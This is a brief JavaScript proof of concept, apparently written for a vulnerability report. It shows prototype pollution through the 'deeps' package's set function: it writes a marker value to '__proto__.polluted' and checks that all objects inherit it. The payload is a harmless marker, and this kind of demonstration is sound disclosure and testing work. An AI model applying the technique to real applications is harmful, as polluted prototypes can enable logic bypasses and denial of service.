var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const deeps = require('deeps');
deeps.set(obj, '__proto__.polluted', 'yes');
console.log({}.polluted);